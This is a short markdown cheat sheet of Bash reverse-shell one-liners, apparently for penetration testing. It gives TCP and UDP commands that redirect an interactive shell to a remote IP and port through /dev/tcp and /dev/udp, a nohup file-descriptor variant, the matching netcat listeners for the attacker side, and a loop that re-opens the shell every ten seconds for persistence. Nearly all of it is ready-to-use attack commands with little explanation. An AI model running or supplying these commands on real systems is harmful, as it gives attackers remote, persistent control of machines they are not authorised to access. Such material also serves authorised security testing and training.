# Bash

## 01 - TCP Method

- Target

```
$ /bin/bash -i >& /dev/tcp/<IP>/<LPORT> 0>&1

$ nohup 0<&103-;exec 103<>/dev/tcp/<IP>/<LPORT>; sh <&103 >&103 2>&103 &2>/dev/null; sleep 1; exit
```

- Attacker

```
userware@hackware-os:~$ nc -lnvp <LPORT>
```

## 02 - UDP Method

- Target

```
$ /bin/bash -i >& /dev/udp/<IP>/<LPORT> 0>&1

$ nohup 0<&103-;exec 103<>/dev/udp/<IP>/<LPORT>; sh <&103 >&103 2>&103 &2>/dev/null; sleep 1; exit
```

- Attacker

```
userware@hackware-os:~$ nc -luvp <LPORT>
```

## 03 - Persistent Callback Shell

- In case you might lose the callback connection. It's better to make it persistent.

```
$ while true; do /bin/bash -c /path/to/shell; sleep 10; done

$ while true; do /bin/bash -i >& /dev/<protocol>/<IP>/<LPORT> 0>&1; sleep 10; done
```

---
## References

- [Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)

- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)